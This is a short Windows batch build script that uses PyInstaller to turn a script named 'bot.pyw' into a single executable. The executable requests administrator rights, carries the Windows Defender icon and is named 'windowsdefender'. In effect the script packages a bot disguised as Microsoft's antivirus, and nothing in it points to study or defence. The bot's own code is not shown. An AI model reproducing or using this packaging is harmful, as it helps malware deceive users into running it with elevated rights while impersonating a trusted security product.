@echo off
pyinstaller -F --uac-admin --distpath ./release/production/ -i ./asset/windows_defender.ico -n windowsdefender bot.pyw
rm -rf ./build *.spec